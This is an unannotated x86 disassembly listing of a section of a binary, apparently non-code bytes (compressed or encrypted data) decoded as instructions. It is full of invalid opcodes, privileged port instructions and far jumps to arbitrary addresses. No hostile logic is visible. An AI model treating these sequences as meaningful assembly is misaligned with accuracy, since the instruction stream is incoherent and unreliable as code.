  41b1a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1a9:	imul   esp,DWORD PTR [eax],0x49243ec9
  41b1af:	sbb    cl,BYTE PTR es:[ebp-0x47f2102e]
  41b1b6:	sbb    al,0xe
  41b1b8:	cmp    BYTE PTR [ebx-0x680816aa],ch
  41b1be:	mov    ch,al
  41b1c0:	arpl   WORD PTR [ebp+ebx*8-0x44],bp
  41b1c4:	inc    ecx
  41b1c5:	and    al,0x12
  41b1c7:	and    DWORD PTR [edi-0x21108fd1],ebx
  41b1cd:	fwait
  41b1ce:	pushf  
  41b1cf:	sahf   
  41b1d0:	sahf   
  41b1d1:	adc    BYTE PTR [esp+eax*1],cl
  41b1d4:	stc    
  41b1d5:	lock inc edi
  41b1d7:	mov    ah,BYTE PTR [edx+eiz*8]
  41b1da:	xor    esp,edi
  41b1dc:	jle    0x41b1fd
  41b1de:	mov    edx,0x64fb23a6
  41b1e3:	and    BYTE PTR [ecx+0xb0b0b30],0xa4
  41b1ea:	shr    BYTE PTR [ecx],cl
  41b1ec:	out    dx,al
  41b1ed:	fistp  QWORD PTR [edi+0x4672b547]
  41b1f3:	cmp    al,0x9e
  41b1f5:	in     al,0x23
  41b1f7:	pop    ds
  41b1f8:	call   FWORD PTR [eax]
  41b1fa:	int    0x46
  41b1fc:	and    DWORD PTR [esi-0x55],0xffffffc9
  41b200:	xor    ah,BYTE PTR fs:[ebp-0xd]
  41b204:	(bad)  
  41b205:	dec    ebp
  41b206:	push   es
  41b207:	sbb    DWORD PTR [esi],0xffffffa5
  41b20a:	push   edx
  41b20b:	mov    DWORD PTR [ebx-0x5fd3ac2d],esi
  41b211:	pop    esp
  41b212:	sub    dl,BYTE PTR [ebx]
  41b214:	mov    al,BYTE PTR [ecx+edi*2-0x5dde1704]
  41b21b:	sub    BYTE PTR [eax],ah
  41b21d:	dec    ecx
  41b21e:	adc    al,BYTE PTR [edi-0x50bf8f9]
  41b224:	jge    0x41b1ba
  41b226:	pusha  
  41b227:	adc    BYTE PTR [ebx-0x3c79dc1d],0x21
  41b22e:	fldcw  WORD PTR [esi+ecx*4-0x1f]
  41b232:	jo     0x41b27c
  41b234:	and    BYTE PTR [eax],bl
  41b236:	and    BYTE PTR [ebp-0x59a59f33],bl
  41b23c:	xor    ah,ch
  41b23e:	(bad)  
  41b240:	int    0xb5
  41b242:	add    eax,edi
  41b244:	call   0xf90d:0x7c029d72
  41b24b:	rol    BYTE PTR [edi+0x3f],1
  41b24e:	not    bl
  41b250:	mov    ds:0x4505f0e1,eax
  41b255:	cdq    
  41b256:	xor    eax,0x3860cf6
  41b25b:	dec    edx
  41b25c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b25d:	xor    ah,BYTE PTR [esi+0x470e11a9]
  41b263:	enter  0xd264,0x8c
  41b267:	push   es
  41b268:	inc    ebx
  41b269:	jl     0x41b2e9
  41b26b:	pop    ds
  41b26c:	(bad)  [esi+edx*1-0x3d]
  41b270:	xor    BYTE PTR [eax-0x75d71429],ch
  41b276:	inc    edx
  41b277:	scas   al,BYTE PTR es:[edi]
  41b278:	push   eax
  41b279:	loopne 0x41b25b
  41b27b:	pusha  
  41b27c:	(bad)  
  41b27d:	rcl    ebx,cl
  41b27f:	adc    edi,DWORD PTR [esi+edi*1+0x5]
  41b283:	add    al,0x81
  41b285:	retf   
  41b286:	retf   
  41b287:	or     eax,DWORD PTR [esi-0x5d]
  41b28a:	and    ecx,ebx
  41b28c:	inc    edx
  41b28d:	sahf   
  41b28e:	test   DWORD PTR [edx-0x6f],esp
  41b291:	leave  
  41b292:	fs inc edx
  41b294:	xor    bl,BYTE PTR [ecx+0x20081022]
  41b29a:	or     BYTE PTR [edx],al
  41b29c:	mov    DWORD PTR [edx+edx*4+0x64],esp
  41b2a0:	and    al,cl
  41b2a2:	into   
  41b2a3:	div    BYTE PTR [esi]
  41b2a5:	aad    0x6a
  41b2a7:	xchg   ebp,eax
  41b2a8:	shr    DWORD PTR [eax+0x44],1
  41b2ab:	sub    al,0x1e
  41b2ad:	and    esp,DWORD PTR [eax+0x4aaa6828]
  41b2b3:	sub    al,0x1e
  41b2b5:	daa    
  41b2b6:	sbb    al,0x89
  41b2b8:	xor    BYTE PTR [esi],bl
  41b2ba:	dec    edi
  41b2bb:	or     BYTE PTR [edi+0x51a2c4c3],al
  41b2c1:	mov    dh,0x1f
  41b2c3:	iret   
  41b2c4:	nop
  41b2c5:	sti    
  41b2c6:	icebp  
  41b2c7:	fs ret 0x3b9d
  41b2cb:	ja     0x41b295
  41b2cd:	out    0xf3,eax
  41b2cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2d0:	xor    ebx,DWORD PTR [ecx]
  41b2d2:	push   esi
  41b2d3:	retf   0x8e25
  41b2d6:	(bad)  
  41b2d7:	dec    edi
  41b2d8:	mov    eax,0x973eff7f
  41b2dd:	xchg   edi,eax
  41b2de:	xchg   edi,eax
  41b2df:	add    al,0x82
  41b2e1:	inc    ecx
  41b2e2:	dec    edx
  41b2e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2e4:	adc    ah,BYTE PTR [edx-0x4e464dd8]
  41b2ea:	mov    es,WORD PTR [ebp+0xf47c3c0]
  41b2f0:	(bad)  
  41b2f2:	fild   DWORD PTR [edi+0x55]
  41b2f5:	push   ebp
  41b2f6:	adc    dh,dh
  41b2f8:	mov    cl,0x93
  41b2fa:	leave  
  41b2fb:	and    al,0xeb
  41b2fd:	imul   ebp,DWORD PTR [ebx-0xd60e1e4],0xfffffff0
  41b304:	loope  0x41b349
  41b306:	into   
  41b307:	into   
  41b308:	sub    al,BYTE PTR [ebx+eiz*2+0x31]
  41b30c:	push   esi
  41b30d:	xchg   edi,eax
  41b30e:	retf   
  41b30f:	clc    
  41b310:	add    eax,DWORD PTR [ecx]
  41b312:	outs   dx,BYTE PTR ds:[esi]
  41b313:	fnstsw WORD PTR [edx+0x7d022335]
  41b319:	in     eax,0x2b
  41b31b:	aam    0x6a
  41b31d:	xor    ebp,DWORD PTR [esi-0x33]
  41b320:	in     eax,dx
  41b321:	(bad)  [edi-0x3dfefdaf]
  41b327:	xchg   ecx,eax
  41b328:	or     BYTE PTR [edx+0x20],cl
  41b32b:	rcr    cl,0xd9
  41b32e:	sub    DWORD PTR [ebp+0x2674876e],edi
  41b334:	dec    ebx
  41b335:	cmp    al,0x91
  41b337:	loopne 0x41b325
  41b339:	in     al,dx
  41b33a:	mov    WORD PTR [edi],fs
  41b33c:	dec    edi
  41b33d:	mov    dh,0x99
  41b33f:	mov    WORD PTR [edi],fs
  41b341:	xchg   esp,eax
  41b342:	push   edi
  41b343:	xchg   esi,eax
  41b344:	leave  
  41b345:	out    0x72,eax
  41b347:	xor    bl,BYTE PTR fs:[ecx]
  41b34a:	ret    0x2891
  41b34d:	pop    es
  41b34e:	sti    
  41b34f:	sti    
  41b350:	push   0x364c9553
  41b355:	mov    eax,DWORD PTR [eax+0x36cecec0]
  41b35b:	mov    DWORD PTR [edi+0x47],0x1639b264
  41b362:	or     bh,BYTE PTR [ecx+0x7a]
  41b365:	std    
  41b366:	push   ds
  41b367:	mov    ds:0xdfbf08e1,eax
  41b36c:	dec    edi
  41b36d:	ss xchg ebx,eax
  41b36f:	and    eax,0x582cd93
  41b374:	in     eax,dx
  41b375:	push   esi
  41b376:	xchg   ebx,eax
  41b377:	ins    BYTE PTR es:[edi],dx
  41b378:	ss iret 
  41b37a:	fcmovb st,st(6)
  41b37c:	cmp    ah,BYTE PTR [edi-0x5557d8d9]
  41b382:	retf   0x5bad
  41b385:	mov    bh,0x18
  41b387:	mov    es,WORD PTR [esi+0x365d3af4]
  41b38d:	mov    dh,0xb6
  41b38f:	cwde   
  41b390:	dec    esi
  41b391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b392:	add    al,0x14
  41b394:	test   DWORD PTR [eax+0x24],esi
  41b397:	ret    0xaa74
  41b39a:	jb     0x41b415
  41b39c:	jns    0x41b3af
  41b39e:	cli    
  41b39f:	clc    
  41b3a0:	idiv   DWORD PTR [ebp-0xa]
  41b3a3:	xlat   BYTE PTR ds:[ebx]
  41b3a4:	mov    edi,0xe8feeff8
  41b3a9:	call   0x47:0x5c94f815
  41b3b0:	dec    edi
  41b3b1:	leave  
  41b3b2:	scas   eax,DWORD PTR es:[edi]
  41b3b3:	inc    bl
  41b3b5:	jmp    FWORD PTR ds:0x3eb46f5c
  41b3bb:	adc    cl,BYTE PTR [ebp-0x248b173b]
  41b3c1:	mov    BYTE PTR [edx+0x635ebd40],ah
  41b3c7:	jge    0x41b446
  41b3c9:	(bad)  
  41b3ca:	leave  
  41b3cb:	js     0x41b411
  41b3cd:	in     eax,dx
  41b3ce:	repnz nop
  41b3d0:	mov    ebx,0xae873dcf
  41b3d5:	jmp    0x41b3c3
  41b3d7:	ins    BYTE PTR es:[edi],dx
  41b3d8:	outs   dx,DWORD PTR ds:[esi]
  41b3d9:	mov    bl,0xb1
  41b3db:	mov    ch,0x45
  41b3dd:	xor    al,0x1a
  41b3df:	mov    ds:0xa74c795a,eax
  41b3e4:	aad    0xc6
  41b3e6:	out    0xf7,eax
  41b3e8:	popa   
  41b3e9:	call   0xacf5:0x4a89d326
  41b3f0:	ret    0x7733
  41b3f3:	lahf   
  41b3f4:	mov    eax,ds:0xd7a45c58
  41b3f9:	jmp    0x41b45d
  41b3fb:	sbb    DWORD PTR [esi],esp
  41b3fd:	xchg   ecx,eax
  41b3fe:	enter  0x998c,0x97
  41b402:	retf   0xa964
  41b405:	xlat   BYTE PTR ds:[ebx]
  41b406:	jmp    0x244f:0x10edec1c
  41b40d:	sub    BYTE PTR [edi],ch
  41b40f:	scas   eax,DWORD PTR es:[edi]
  41b410:	and    bl,bh
  41b412:	fs add al,0x41
  41b415:	pusha  
  41b416:	xor    al,0x1a
  41b418:	adc    ecx,DWORD PTR [ebp+0x13c449c6]
  41b41e:	les    esp,FWORD PTR [ebx+0x31]
  41b421:	xor    bh,BYTE PTR [ecx-0x987324]
  41b427:	call   0x94b2454d
  41b42c:	aad    0xf5
  41b42e:	jne    0x41b3ba
  41b430:	mov    ecx,DWORD PTR [ebx+0x5263c78c]
  41b436:	test   eax,0x8e1a314
  41b43b:	shl    DWORD PTR [edx],cl
  41b43d:	sbb    DWORD PTR [esi],ecx
  41b43f:	pop    es
  41b440:	fs mov bl,0x69
  41b443:	add    al,0x41
  41b445:	mov    ah,0x4b
  41b447:	je     0x41b49c
  41b449:	inc    eax
  41b44a:	and    BYTE PTR [ebp+0x6eba24c],dl
  41b450:	mov    DWORD PTR [eax+0xc],edi
  41b453:	push   ebp
  41b454:	push   ebx
  41b455:	imul   edx,esp,0x43870cea
  41b45b:	call   0x43bd:0x9f7726cd
  41b462:	cmp    BYTE PTR [edx],dl
  41b464:	data16 xor bl,BYTE PTR [ecx-0x27dbb76e]
  41b46b:	fstp   TBYTE PTR [edi]
  41b46d:	mov    al,ds:0x4a22ebdf
  41b472:	xchg   edx,eax
  41b473:	int    0x64
  41b475:	or     al,0x10
  41b477:	lea    eax,[eax+edx*4-0x14]
  41b47b:	fist   WORD PTR [ecx]
  41b47d:	inc    esp
  41b47e:	adc    al,0x45
  41b480:	and    DWORD PTR [esi+ecx*1],ebx
  41b483:	jae    0x41b4f6
  41b485:	jns    0x41b450
  41b487:	leave  
  41b488:	rcl    DWORD PTR [ecx],1
  41b48a:	push   ebx
  41b48b:	push   ebp
  41b48c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b48d:	push   esp
  41b48e:	sub    dh,BYTE PTR [ecx-0x1d]
  41b491:	out    0x4d,al
  41b493:	push   edx
  41b494:	test   eax,0x12e54b34
  41b499:	ror    ecx,cl
  41b49b:	fs inc esi
  41b49d:	sbb    DWORD PTR [esi],0xa244890d
  41b4a3:	add    al,0x94
  41b4a5:	add    BYTE PTR [ebp+0x5d0c4b8b],dh
  41b4ab:	and    edx,DWORD PTR [edx+ecx*1]
  41b4ae:	mov    cl,0x75
  41b4b0:	jecxz  0x41b4b8
  41b4b2:	mov    ebp,0xcd8d8f6e
  41b4b7:	dec    ebp
  41b4b8:	cs into 
  41b4ba:	sub    esi,DWORD PTR [ebx+ebx*8+0x4649241d]
  41b4c1:	push   ebp
  41b4c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4c3:	sbb    al,0x1d
  41b4c5:	push   ds
  41b4c6:	repnz clc 
  41b4c8:	icebp  
  41b4c9:	and    esp,DWORD PTR [edx+0x7d2f38d1]
  41b4cf:	loopne 0x41b536
  41b4d1:	pop    edx
  41b4d2:	int    0x26
  41b4d4:	lea    edi,[edx+0x3]
  41b4d7:	mov    edi,0x679dcfcf
  41b4dc:	sahf   
  41b4dd:	cmp    bl,BYTE PTR gs:[ecx+0x6cd92c45]
  41b4e4:	xchg   BYTE PTR [esi+eiz*1+0x43],cl
  41b4e8:	and    al,0x1a
  41b4ea:	and    edx,esp
  41b4ec:	in     eax,dx
  41b4ed:	mov    bl,0xb6
  41b4ef:	mov    dh,0x8e
  41b4f1:	dec    edi
  41b4f2:	not    BYTE PTR [ecx]
  41b4f4:	pop    DWORD PTR [edi+0x51]
  41b4f7:	add    DWORD PTR [ecx],0xfffffffa
  41b4fa:	std    
  41b4fb:	add    edx,esp
  41b4fd:	ins    BYTE PTR es:[edi],dx
  41b4fe:	fidiv  DWORD PTR ss:[ebx]
  41b501:	fwait
  41b502:	aaa    
  41b503:	out    dx,eax
  41b504:	ins    BYTE PTR es:[edi],dx
  41b505:	add    bl,bl
  41b507:	out    dx,eax
  41b508:	repnz in eax,dx
  41b50a:	cmc    
  41b50b:	pop    ebp
  41b50c:	daa    
  41b50d:	xlat   BYTE PTR ds:[ebx]
  41b50e:	adc    eax,eax
  41b510:	push   ebx
  41b511:	repnz add ebx,DWORD PTR [edi]
  41b514:	pop    esp
  41b515:	jge    0x41b4c5
  41b517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b518:	(bad)  
  41b519:	jle    0x41b541
  41b51b:	sbb    cl,BYTE PTR [esi]
  41b51d:	or     bl,ah
  41b51f:	ror    DWORD PTR [eax-0x44cac5ac],1
  41b525:	cmp    DWORD PTR ds:0x6a010250,eax
  41b52b:	cmc    
  41b52c:	call   0x3468:0xd02f23dd
  41b533:	sbb    DWORD PTR [edi-0x7075d739],ecx
  41b539:	jmp    0xdff0ffb2
  41b53e:	daa    
  41b53f:	push   ds
  41b540:	mov    edx,DWORD PTR [ebx+0x1c302fcf]
  41b546:	cmc    
  41b547:	ins    DWORD PTR es:[edi],dx
  41b548:	ret    0x914e
  41b54b:	dec    eax
  41b54c:	sub    al,0x4a
  41b54e:	es fwait
  41b550:	ret    
  41b551:	out    dx,eax
  41b552:	div    DWORD PTR [ebx+0x76]
  41b555:	jp     0x41b599
  41b557:	mov    ebx,0x7715b2dd
  41b55c:	enter  0xc9e9,0x31
  41b560:	add    DWORD PTR [ecx-0x61],0x78
  41b564:	cmp    al,0xce
  41b566:	jmp    0xcb90:0x20821aea
  41b56d:	out    0x10,eax
  41b56f:	mov    al,0xe8
  41b571:	je     0x41b52d
  41b573:	dec    esp
  41b574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b575:	rcr    DWORD PTR [ecx+0x1d],cl
  41b578:	mov    ebp,0x7672a6d3
  41b57d:	dec    edx
  41b57e:	mov    bh,0xdb
  41b580:	arpl   WORD PTR [ecx+0x6b736254],bp
  41b586:	mov    ecx,DWORD PTR [eax+0x24]
  41b589:	cmp    dh,BYTE PTR [ebx]
  41b58b:	dec    esp
  41b58c:	shl    DWORD PTR [ecx],cl
  41b58e:	pop    edi
  41b58f:	stc    
  41b590:	repnz imul ebx,DWORD PTR [ebp+ebx*4+0x261ba19d],0xffffffa5
  41b599:	rcl    BYTE PTR [edx],cl
  41b59b:	mov    dl,0x24
  41b59d:	xchg   ecx,eax
  41b59e:	leave  
  41b59f:	fs dec eax
  41b5a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5a2:	xchg   edx,eax
  41b5a3:	push   esp
  41b5a4:	sub    edx,DWORD PTR [ebp-0xa]
  41b5a7:	div    dh
  41b5a9:	sbb    BYTE PTR [ebp-0x502ae19a],cl
  41b5af:	sub    al,ch
  41b5b1:	call   0x69ba:0x22d2d2ce
  41b5b8:	jb     0x41b62c
  41b5ba:	jl     0x41b5fe
  41b5bc:	mov    ch,0x5a
  41b5be:	add    eax,0x8182041
  41b5c3:	bound  ebx,QWORD PTR [edx+0x26]
  41b5c6:	(bad)
  41b5c9:	test   eax,0xa3838264
  41b5ce:	and    esi,DWORD PTR [esi-0x2a59c0e1]
  41b5d4:	push   0xffffff93
  41b5d6:	das    
  41b5d7:	in     al,0x29
  41b5d9:	cs cs xchg edx,eax
  41b5dc:	dec    esp
  41b5dd:	es mov ecx,0xe726e371
  41b5e3:	out    0x55,eax
  41b5e5:	sahf   
  41b5e6:	cmp    al,0xd9
  41b5e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5e9:	fucomi st,st(1)
  41b5eb:	mov    dl,0xb4
  41b5ed:	mov    eax,0x99797948
  41b5f2:	icebp  
  41b5f3:	js     0x41b641
  41b5f5:	and    BYTE PTR [eax],dl
  41b5f7:	inc    eax
  41b5f8:	push   ebx
  41b5f9:	push   ebp
  41b5fa:	call   0xcacf:0xd93e26cd
  41b601:	jmp    0x8fc7:0x876edd2a
  41b608:	push   ds
  41b609:	push   ecx
  41b60a:	cmp    DWORD PTR [ebx],edi
  41b60c:	and    eax,0xa96050bf
  41b611:	mov    eax,0xb36baa84
  41b616:	or     BYTE PTR [ebx+0x30],ch
  41b619:	inc    eax
  41b61a:	xlat   BYTE PTR ds:[ebx]
  41b61b:	xor    al,0x96
  41b61d:	dec    edx
  41b61e:	and    eax,0x1e254a96
  41b623:	ds mov eax,0x23d7af4f
  41b629:	adc    cl,BYTE PTR [ebp+0x760128a2]
  41b62f:	in     eax,dx
  41b630:	call   0x48307f95
  41b635:	cmp    al,bl
  41b637:	fbld   TBYTE PTR [ebx+0x32]
  41b63a:	sbb    DWORD PTR [ebx+0x5e],edx
  41b63d:	pop    esi
  41b63e:	popa   
  41b63f:	cmp    BYTE PTR [eax],bl
  41b641:	shr    ch,cl
  41b643:	into   
  41b644:	mov    edx,0xa4494500
  41b649:	aad    0x6c
  41b64b:	nop
  41b64c:	into   
  41b64d:	fs mov ecx,0xd7a73f38
  41b653:	popf   
  41b654:	xor    DWORD PTR [edi+eiz*4],esp
  41b657:	mov    edx,0x8486cbe1
  41b65c:	sti    
  41b65d:	mov    edi,0xfaffbbf3
  41b662:	retf   
  41b663:	out    dx,eax
  41b664:	idiv   ch
  41b666:	cmc    
  41b667:	frstor [esi]
  41b669:	out    dx,eax
  41b66a:	(bad)  [eax]
  41b66c:	loopne 0x41b66a
  41b66e:	xchg   edi,eax
  41b66f:	outs   dx,BYTE PTR ds:[esi]
  41b670:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b671:	xchg   BYTE PTR [ecx+0x62fc5767],dh
  41b677:	jg     0x41b64e
  41b679:	mov    edi,0x234aafff
  41b67e:	popa   
  41b67f:	and    DWORD PTR [edx+edi*8],esp
  41b682:	jecxz  0x41b685
  41b684:	rcl    eax,1
  41b686:	add    dl,0x74
  41b689:	adc    al,0xb0
  41b68b:	je     0x41b6e2
  41b68d:	mov    ah,0x2c
  41b68f:	dec    ebx
  41b690:	adc    al,0x2d
  41b692:	pop    ebp
  41b693:	aam    0x45
  41b695:	pop    ecx
  41b696:	and    al,0x91
  41b698:	xchg   esp,eax
  41b699:	sub    eax,0x434cb053
  41b69e:	adc    eax,0xb7ec6d2d
  41b6a3:	sub    al,0x7b
  41b6a5:	mov    dh,0x1e
  41b6a7:	repz loope 0x41b642
  41b6aa:	arpl   WORD PTR ds:[edx-0x23c5c03],sp
  41b6b1:	mov    ebx,0x41051794
  41b6b6:	adc    al,0x49
  41b6b8:	addr16 mov dl,0x64
  41b6bb:	mov    bl,0x79
  41b6bd:	cmp    ch,ch
  41b6bf:	push   ss
  41b6c0:	mov    edx,0x64c991a1
  41b6c5:	imul   edx,esp,0x3dfbf4eb
  41b6cb:	dec    edx
  41b6cc:	in     eax,0x92
  41b6ce:	imul   eax,DWORD PTR [eax],0xffffffe2
  41b6d1:	icebp  
  41b6d2:	and    al,0xc1
  41b6d4:	push   eax
  41b6d5:	mov    ch,bh
  41b6d7:	mov    ebp,0x2449443d
  41b6dc:	xchg   ecx,eax
  41b6dd:	dec    esp
  41b6de:	mov    al,0xb9
  41b6e0:	mov    ecx,0x7428a285
  41b6e5:	mov    ebx,0xe9d3a5d
  41b6ea:	cdq    
  41b6eb:	ins    BYTE PTR es:[edi],dx
  41b6ec:	xchg   BYTE PTR [eax+0x3a],bh
  41b6ef:	ret    
  41b6f0:	mov    ds:0xd190f47,eax
  41b6f5:	push   es
  41b6f6:	or     BYTE PTR [edx-0x6a9a86c0],al
  41b6fc:	ret    0x9162
  41b6ff:	outs   dx,BYTE PTR ds:[esi]
  41b700:	mov    ebx,0x484a288b
  41b705:	mov    dl,0x44
  41b707:	ds xchg edi,eax
  41b709:	daa    
  41b70a:	cdq    
  41b70b:	dec    edx
  41b70c:	shr    edi,cl
  41b70e:	ja     0x41b789
  41b710:	repnz in al,0x11
  41b713:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b714:	imul   esp,DWORD PTR [ecx-0x7a7ac515],0x12e2c53c
  41b71e:	stos   BYTE PTR es:[edi],al
  41b71f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b720:	arpl   WORD PTR [ecx+0x25daf526],bx
  41b726:	popf   
  41b727:	jbe    0x41b6b4
  41b729:	inc    esp
  41b72a:	and    cl,BYTE PTR [esi+0x5554c165]
  41b730:	sbb    DWORD PTR [esi+0x3070cc6],ecx
  41b736:	push   edx
  41b737:	leave  
  41b738:	and    al,0xac
  41b73a:	pop    edx
  41b73b:	xor    eax,DWORD PTR [edx+0x4d]
  41b73e:	xor    al,0xca
  41b740:	out    dx,al
  41b741:	into   
  41b742:	push   ds
  41b743:	mov    ch,0x8b
  41b745:	sbb    ch,ch
  41b747:	jbe    0x41b6e4
  41b749:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b74a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b74b:	and    dh,BYTE PTR [edi+0x6e]
  41b74e:	frstor [edx]
  41b750:	fwait
  41b751:	leave  
  41b752:	xchg   edx,eax
  41b753:	iret   
  41b754:	cmp    DWORD PTR [bx],edi
  41b757:	mov    edi,0xf777764
  41b75c:	dec    ebp
  41b75d:	push   ebx
  41b75e:	mov    DWORD PTR [ebx+eax*8-0x41d0744],eax
  41b765:	mov    BYTE PTR [ebx+eiz*1+0x28],al
  41b769:	mov    al,BYTE PTR [edx+0x30]
  41b76c:	mov    al,ds:0x43c1ff70
  41b771:	inc    esi
  41b772:	jecxz  0x41b7a5
  41b774:	or     BYTE PTR ds:0x9600c182,bl
  41b77a:	imul   esi,DWORD PTR [ecx],0xd318d1e
  41b780:	sbb    eax,0x3f2b3c9f
  41b785:	cli    
  41b786:	jge    0x41b789
  41b788:	sub    al,0x4
  41b78a:	mov    dh,0x1f
  41b78c:	aas    
  41b78d:	outs   dx,WORD PTR ds:[esi]
  41b78f:	outs   dx,DWORD PTR ds:[esi]
  41b790:	outs   dx,DWORD PTR ds:[esi]
  41b791:	push   esi
  41b792:	and    eax,0x979371b8
  41b797:	pop    esi
  41b798:	jle    0x41b71f
  41b79a:	shl    DWORD PTR [eax-0x1a62c5b9],0xe0
  41b7a1:	pusha  
  41b7a2:	(bad)  
  41b7a3:	shr    DWORD PTR [eax-0x74],1
  41b7a6:	and    al,0x49
  41b7a8:	test   al,0xaa
  41b7aa:	(bad)  
  41b7ab:	jmp    0x1ed0e189
  41b7b0:	ds and al,0x91
  41b7b3:	dec    esp
  41b7b4:	lock in al,dx
  41b7b6:	mov    bl,0x77
  41b7b8:	mov    DWORD PTR [esi-0x5d],eax
  41b7bb:	call   0x45e7c67a
  41b7c0:	xor    al,0x16
  41b7c2:	inc    ebx
  41b7c3:	xchg   esp,eax
  41b7c4:	outs   dx,BYTE PTR fs:[esi]
  41b7c6:	fnstsw WORD PTR [esi-0x5f2e54b3]
  41b7cc:	shr    DWORD PTR [edx+eiz*4+0x4],1
  41b7d0:	add    cl,BYTE PTR [edi+eax*1]
  41b7d3:	add    ecx,esi
  41b7d5:	sub    esp,DWORD PTR [edi-0x64]
  41b7d8:	push   edi
  41b7d9:	iret   
  41b7da:	pop    ecx
  41b7db:	pop    esi
  41b7dc:	pop    ecx
  41b7dd:	popa   
  41b7de:	cmp    BYTE PTR [edx+esi*2],bl
  41b7e1:	js     0x41b857
  41b7e3:	and    BYTE PTR [eax],0x88
  41b7e6:	xor    bl,BYTE PTR fs:[ecx]
  41b7e9:	sub    ah,BYTE PTR [edi+0x23870c27]
  41b7ef:	(bad)
  41b7f4:	add    edi,DWORD PTR [edi+0x3571367f]
  41b7fa:	sbb    cl,BYTE PTR [ecx+0x7ca8bf51]
  41b800:	loope  0x41b821
  41b802:	jg     0x41b85e
  41b804:	clc    
  41b805:	mov    al,ds:0x80b25a28
  41b80a:	xor    bl,bl
  41b80c:	out    0x8c,al
  41b80e:	xor    esp,DWORD PTR [esi-0x2efbed23]
  41b814:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b815:	retf   
  41b816:	jle    0x41b871
  41b818:	pop    ss
  41b819:	add    eax,0xd4df04b
  41b81e:	inc    ebx
  41b81f:	xor    BYTE PTR ds:0x53441453,al
  41b825:	adc    al,BYTE PTR [ebx+edx*2]
  41b828:	nop
  41b829:	fs dec ebx
  41b82b:	xchg   edi,eax
  41b82c:	adc    eax,0x11e510d5
  41b831:	call   0xb9b1:0xcd690a36
  41b838:	nop
  41b839:	lods   al,BYTE PTR ds:[esi]
  41b83a:	sahf   
  41b83b:	test   BYTE PTR [esi+0x3e],bl
  41b83e:	retf   0xee34
  41b841:	popf   
  41b842:	jle    0x41b83a
  41b844:	(bad)  
  41b845:	cmp    al,0x3f
  41b847:	jg     0x41b820
  41b849:	adc    al,0xe1
  41b84b:	ins    DWORD PTR es:[edi],dx
  41b84c:	retf   0xce7b
  41b84f:	add    BYTE PTR [edi+edi*8],bl
  41b852:	test   bh,0x9
  41b855:	add    DWORD PTR [edi-0x36200a41],0x89fbdad
  41b85f:	pop    esp
  41b860:	outs   dx,BYTE PTR ds:[esi]
  41b861:	scas   eax,DWORD PTR es:[edi]
  41b862:	pop    ecx
  41b863:	push   ss
  41b864:	and    BYTE PTR [edx+0x1ac73adf],al
  41b86a:	lahf   
  41b86b:	iret   
  41b86c:	xlat   BYTE PTR ds:[ebx]
  41b86d:	pop    cx
  41b86f:	mov    bl,0xa5
  41b871:	sbb    esp,DWORD PTR [esi+0x69265b39]
  41b877:	cmc    
  41b878:	pop    ebx
  41b879:	mov    bl,0xcd
  41b87b:	cmp    eax,esi
  41b87d:	ins    BYTE PTR es:[edi],dx
  41b87e:	in     eax,dx
  41b87f:	adc    al,0x16
  41b881:	out    dx,al
  41b882:	ret    0x4b4c
  41b885:	lahf   
  41b886:	lea    edi,[ebx+ebp*8-0x569581a8]
  41b88d:	add    dl,cl
  41b88f:	icebp  
  41b890:	add    BYTE PTR [ebx+0x30],al
  41b893:	pop    ecx
  41b894:	pop    eax
  41b895:	cwde   
  41b896:	push   ecx
  41b897:	pop    ecx
  41b898:	mov    ecx,DWORD PTR [ebx-0x7afefdbb]
  41b89e:	pop    eax
  41b89f:	xor    al,0xc6
  41b8a1:	repnz retf 0x9332
  41b8a5:	shl    DWORD PTR [esi+esi*1-0x28],1
  41b8a9:	arpl   WORD PTR [ecx-0x67],di
  41b8ac:	pop    esi
  41b8ad:	scas   eax,DWORD PTR es:[edi]
  41b8ae:	xchg   DWORD PTR [esi+0x18],ebp
  41b8b1:	les    esp,FWORD PTR [edx-0x4122918f]
  41b8b7:	sub    DWORD PTR [ebx+edi*8],0x38
  41b8bb:	cmp    eax,0x60c2c13e
  41b8c0:	jne    0x41b92f
  41b8c2:	popf   
  41b8c3:	(bad)  
  41b8c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8c5:	into   
  41b8c6:	jmp    0x56eec2b4
  41b8cb:	mov    esi,ebp
  41b8cd:	dec    ebp
  41b8ce:	add    DWORD PTR [edx+eiz*1-0x3f],0x70
  41b8d3:	xor    BYTE PTR [eax+0x57],al
  41b8d6:	xor    eax,0x8a2c99b2
  41b8db:	fistp  QWORD PTR [edi]
  41b8dd:	stos   DWORD PTR es:[edi],eax
  41b8de:	sbb    al,bh
  41b8e0:	jl     0x41b8ce
  41b8e2:	pop    ds
  41b8e3:	sbb    al,0xd0
  41b8e5:	out    dx,eax
  41b8e6:	jbe    0x41b940
  41b8e8:	pop    esp
  41b8e9:	sub    dl,BYTE PTR [ecx]
  41b8eb:	or     al,0x4
  41b8ed:	nop
  41b8ee:	jge    0x41b96e
  41b8f0:	push   es
  41b8f1:	mov    ebp,0x253a9a1e
  41b8f6:	push   ds
  41b8f7:	mov    esi,DWORD PTR [ebx-0xd]
  41b8fa:	imul   BYTE PTR [ebp+0x7c]
  41b8fd:	mov    dl,0xf
  41b8ff:	inc    ecx
  41b900:	adc    al,0xf9
  41b902:	sar    BYTE PTR [edi-0x4a68dd01],cl
  41b908:	dec    ebx
  41b909:	sbb    cl,ch
  41b90b:	es mov bh,0x6f
  41b90e:	(bad)  
  41b910:	into   
